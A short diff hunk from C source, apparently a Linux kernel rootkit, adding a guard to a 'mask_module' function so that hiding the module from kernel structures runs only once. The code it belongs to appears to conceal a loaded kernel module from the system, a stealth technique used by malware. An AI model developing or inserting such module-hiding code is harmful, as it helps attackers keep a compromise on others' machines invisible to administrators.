@@ -98,6 +98,9 @@ void mask_module(void)
 {
 	struct kernfs_node *kernfs_node_ptr;
 
+	if (module_is_hidden)
+		return;
+
 	module_is_hidden = 1;
 
 	/* All kernel modules are associated with a unique struct module structure. These
